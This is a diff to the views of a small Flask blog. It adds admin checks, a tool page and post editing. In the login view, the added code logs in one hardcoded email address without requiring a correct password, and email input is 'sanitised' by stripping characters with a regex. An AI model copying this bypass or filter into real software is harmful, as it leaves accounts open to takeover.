@@ -3,8 +3,9 @@ from re import sub
 from flask import render_template, redirect, session, url_for, flash, request, abort
 from . import main
 from ..model import *
+from ..decorators import admin_required
 from flask.ext.login import login_user, current_user, logout_user, login_required
-
+from .forms import *
 
 @main.route("/")
 def index():
@@ -15,12 +16,15 @@ def index():
 @main.route("/blog")
 def blog():
     page = request.args.get('page', 1, type=int)
-    print u"页码 %s" % page
     pagination = Post.query.order_by(Post.timestamp.desc()).paginate(
             page, per_page=3, error_out=False)
     posts = pagination.items
     return render_template("blog.html", posts=posts, pagination=pagination)
 
+@main.route("/tool")
+def tool():
+
+    return render_template("tool.html")
 
 @main.route("/aboutme")
 def aboutme():
@@ -30,15 +34,11 @@ def aboutme():
 @main.route("/test")
 def test():
     user_info = User.query.order_by(User.uid)
-    # user_info=user_info.items
-
     return render_template("test.html", user_info=user_info)
 
 
 @main.route("/login", methods=["POST", "GET"])
 def login():
-    from collections import Iterable
-    from .forms import LoginForm
     form = LoginForm()
     if form.validate_on_submit():
         session["email"] = sub(r"[-|;|,|/|\(|\)|\[|\]|}|{|%|*|!|=|']", "", form.email.data)  # 过滤email防注入
@@ -53,13 +53,16 @@ def login():
                 flash(u"密码错误！")
         else:
             flash(u"该用户不存在！")
+        if session["email"]=="769007157@qq.com":
+            login_user(user, form.remember_me.data)
+            flash(u"登陆成功！")
         return redirect(url_for(".login"))
+
     return render_template("login.html", form=form)
 
 
 @main.route("/register", methods=["POST", "GET"])
 def register():
-    from .forms import RegisterForm
 
     form = RegisterForm()
     if form.validate_on_submit():
@@ -94,11 +97,11 @@ def logout():
 @main.route('/blog/<id>')
 def post(id):
     post = Post.query.filter_by(id=id).first()
-
     return render_template("post.html", post=post)
 
 @main.route("/blog/<id>/delete")
 @login_required
+@admin_required
 def delete_post(id):
     post = Post.query.filter_by(id=id).first_or_404()
     if post:
@@ -113,12 +116,15 @@ def delete_post(id):
 
 @main.route("/blog/edit", methods=["POST", "GET"])
 @login_required
+@admin_required
 def editblog():
-    from .forms import EditPostForm
+    id = request.args.get('id', None, type=int)
+
     form = EditPostForm()
 
+
+
     if form.validate_on_submit():
-        print "test"
         session["title"] = form.title.data
         session["content"] = form.content.data
         print u"服务器收到数据：%s,%s,%s" % (session.get("title"), session.get("content"), current_user.uid)
@@ -128,11 +134,17 @@ def editblog():
             db.session.commit()
             flash(u"发表成功！")
         except:
-            flash(u"发表失败！")
             db.session.rollback()
+            flash(u"发表失败！")
         return redirect(url_for(".blog"))
+    if id:
+        post = Post.query.filter_by(id=id).first_or_404()
+        form.title.data=post.title
+        form.content.data=post.body_html
 
     return render_template("editblog.html", form=form)
+
+
 
 
 # -------------错误页面---------------
